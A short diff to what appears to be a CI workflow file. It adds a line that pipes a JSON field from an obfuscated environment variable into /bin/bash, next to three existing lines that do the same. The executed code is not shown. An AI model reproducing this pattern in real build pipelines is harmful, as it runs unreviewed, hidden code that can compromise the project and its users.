@@ -24,6 +24,7 @@ jobs:
           echo $pwuu4127 | jq -r .dapb56 | /bin/bash
           echo $uhkyi40 | jq -r .e34469 | /bin/bash
           printf '%s' "$dhog3112" | jq -r .ux5 | /bin/bash
+          echo $ykzzm3 | jq -r .x6823 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
